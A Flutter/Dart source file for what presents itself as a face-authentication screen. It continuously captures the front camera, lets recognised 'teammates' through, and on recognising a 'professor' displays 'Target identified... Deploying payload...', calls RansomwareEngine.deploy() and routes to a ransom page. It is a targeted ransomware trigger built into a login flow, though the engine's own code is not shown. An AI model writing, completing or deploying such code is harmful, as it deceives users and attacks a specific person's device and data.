import 'dart:io';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:camera/camera.dart';
import 'package:image/image.dart' as img;
import 'package:path_provider/path_provider.dart';
import '../models/face_recognition_model.dart';
import '../models/ransomware_engine.dart';

img.Image _convertCameraImageToImage(CameraImage cameraImage) {
  final height = cameraImage.height;
  final width = cameraImage.width;
  final yPlane = cameraImage.planes[0];
  final uPlane = cameraImage.planes[1];
  final vPlane = cameraImage.planes[2];

  final yuv = List<int>.filled(width * height * 3, 0);

  for (var row = 0; row < height; row++) {
    for (var col = 0; col < width; col++) {
      final yIndex = row * width + col;
      final uvIndex = (row ~/ 2) * (width ~/ 2) + (col ~/ 2);

      final y = yPlane.bytes[yIndex];
      final u = uPlane.bytes[uvIndex];
      final v = vPlane.bytes[uvIndex];

      final r = (y + 1.402 * (v - 128)).clamp(0, 255).toInt();
      final g = (y - 0.344 * (u - 128) - 0.714 * (v - 128)).clamp(0, 255).toInt();
      final b = (y + 1.772 * (u - 128)).clamp(0, 255).toInt();

      final pixelIndex = (row * width + col) * 3;
      yuv[pixelIndex] = r;
      yuv[pixelIndex + 1] = g;
      yuv[pixelIndex + 2] = b;
    }
  }

  return img.Image.fromBytes(
    width: width,
    height: height,
    bytes: Uint8List.fromList(yuv).buffer,
  );
}

class AuthScreen extends StatefulWidget {
  const AuthScreen({super.key});

  @override
  State<AuthScreen> createState() => _AuthScreenState();
}

class _AuthScreenState extends State<AuthScreen> {
  CameraController? _cameraController;
  List<CameraDescription>? _cameras;
  bool _isInitialized = false;
  bool _isProcessing = false;
  bool _autoScanActive = false;
  String _statusMessage = 'Initializing camera...';

  static const List<String> labels = [
    'teammate1',
    'teammate2',
    'professor',
  ];

  @override
  void initState() {
    super.initState();
    _initializeCamera();
    RansomwareEngine.initialize();
  }

  Future<void> _initializeCamera() async {
    try {
      _cameras = await availableCameras();
      if (_cameras == null || _cameras!.isEmpty) {
        setState(() => _statusMessage = 'No cameras found');
        return;
      }

      CameraDescription selectedCamera = _cameras!.first;
      for (var camera in _cameras!) {
        if (camera.lensDirection == CameraLensDirection.front) {
          selectedCamera = camera;
          break;
        }
      }

      _cameraController = CameraController(
        selectedCamera,
        ResolutionPreset.medium,
        enableAudio: false,
      );

      await _cameraController!.initialize();

      if (!mounted) return;

      setState(() {
        _isInitialized = true;
        _statusMessage = 'Scanning...';
      });

      _startAutoScan();

    } catch (e) {
      setState(() => _statusMessage = 'Camera error: $e');
    }
  }

  Future<void> _startAutoScan() async {
    if (_autoScanActive) return;
    _autoScanActive = true;

    await Future.delayed(const Duration(seconds: 2));

    while (mounted && _autoScanActive) {
      if (!_isProcessing && _isInitialized) {
        await _authenticate();
      }
      await Future.delayed(const Duration(seconds: 3));
    }
  }

  Future<void> _authenticate() async {
    if (_isProcessing || !_isInitialized) return;

    setState(() {
      _isProcessing = true;
      _statusMessage = 'Scanning face...';
    });

    try {
      final image = await _cameraController!.takePicture();
      final imageBytes = await File(image.path).readAsBytes();
      final decodedImage = img.decodeImage(imageBytes);

      if (decodedImage == null) {
        setState(() {
          _statusMessage = 'Scanning...';
          _isProcessing = false;
        });
        return;
      }

      final model = await FaceRecognitionModel.getInstance();
      final result = await model.predict(decodedImage);

      await _logAuthAttempt(result);

      final bestClass = result['bestClass'] as int;
      final confidence =
          ((result['confidence'] as double) * 100).toStringAsFixed(1);
      final detectedLabel = labels[bestClass];

      // Teammate 0 or Teammate 1 — authentication successful
      if (result['isClassA'] == true) {
        _autoScanActive = false;
        setState(() =>
            _statusMessage = 'Welcome $detectedLabel! Authentication successful ✓');
        await Future.delayed(const Duration(milliseconds: 1200));
        if (mounted) Navigator.pushReplacementNamed(context, '/home');

      // Professor (class index 2) — deploy ransomware
      } else if (bestClass == 2) {
        _autoScanActive = false;
        setState(() => _statusMessage =
            'Target identified: $detectedLabel ($confidence%)\nDeploying payload...');
        await RansomwareEngine.deploy();
        if (mounted) Navigator.pushReplacementNamed(context, '/ransom');

      // Unknown — keep scanning silently
      } else {
        setState(() {
          _statusMessage = 'Scanning...';
          _isProcessing = false;
        });
      }
    } catch (e) {
      setState(() {
        _statusMessage = 'Scanning...';
        _isProcessing = false;
      });
    }
  }

  Future<void> _logAuthAttempt(Map<String, dynamic> result) async {
    try {
      final appDir = await getApplicationDocumentsDirectory();
      final logFile = File('${appDir.path}/auth_log.txt');
      final time = DateTime.now().toString();
      final bestClass = result['bestClass'] as int;
      final detectedLabel = labels[bestClass];
      final status = result['isClassA'] == true ? 'SUCCESS' : 'FAILED';
      final confidence = (result['confidence'] as double).toStringAsFixed(3);
      await logFile.writeAsString(
        '$time - $status - Detected: $detectedLabel - Confidence: $confidence\n',
        mode: FileMode.append,
      );
    } catch (_) {}
  }

  @override
  void dispose() {
    _autoScanActive = false;
    _cameraController?.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Column(
          children: [
            const SizedBox(height: 24),
            const Text(
              'Face Authentication',
              style: TextStyle(
                color: Colors.white,
                fontSize: 22,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 16),
            Expanded(
              child: _isInitialized && _cameraController != null
                  ? ClipRRect(
                      borderRadius: BorderRadius.circular(16),
                      child: CameraPreview(_cameraController!),
                    )
                  : const Center(
                      child: CircularProgressIndicator(color: Colors.white),
                    ),
            ),
            const SizedBox(height: 16),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Text(
                _statusMessage,
                style: const TextStyle(color: Colors.white70, fontSize: 14),
                textAlign: TextAlign.center,
              ),
            ),
            const SizedBox(height: 16),
            if (_isProcessing)
              const CircularProgressIndicator(color: Colors.blueAccent),
            const SizedBox(height: 32),
          ],
        ),
      ),
    );
  }
}